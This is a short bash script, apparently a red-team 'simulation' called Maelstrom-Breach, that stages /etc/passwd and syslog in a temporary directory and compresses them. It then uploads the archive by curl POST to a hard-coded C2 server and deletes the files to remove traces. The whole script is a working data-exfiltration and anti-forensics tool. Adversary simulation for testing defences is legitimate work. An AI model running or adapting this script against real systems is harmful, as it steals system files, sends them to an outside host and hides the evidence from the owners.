#!/bin/bash
# ------------------------------------------------------------------------------
# @project     Maelstrom-Breach (v2.0)
# @payload     Data Exfiltration Simulation (MITRE T1041)
# @description Compresses sensitive logs and "leaks" them via HTTP POST.
# ------------------------------------------------------------------------------

C2_SERVER="http://192.168.1.100:8080/incoming"
EXFIL_DIR="/tmp/eyeC_exfil_$(date +%Y%m%d)"

echo -e "\033[1;31m[!] Maelstrom: Starting Data Exfiltration Phase...\033[0m"

# 1. Stage the data (Recon inside the target)
mkdir -p $EXFIL_DIR
cp /etc/passwd $EXFIL_DIR/  # Simulated target file
cp /var/log/syslog $EXFIL_DIR/ 2>/dev/null

# 2. Compress the evidence
tar -czf ${EXFIL_DIR}.tar.gz -C /tmp $(basename $EXFIL_DIR)

# 3. Exfiltrate to C2
echo "[*] Sending archive to C2 server..."
curl -X POST -F "data=@${EXFIL_DIR}.tar.gz" $C2_SERVER --silent

# 4. Cleanup (Anti-forensics simulation)
rm -rf $EXFIL_DIR ${EXFIL_DIR}.tar.gz
echo -e "\033[0;32m[+] Exfiltration complete. Traces removed.\033[0m"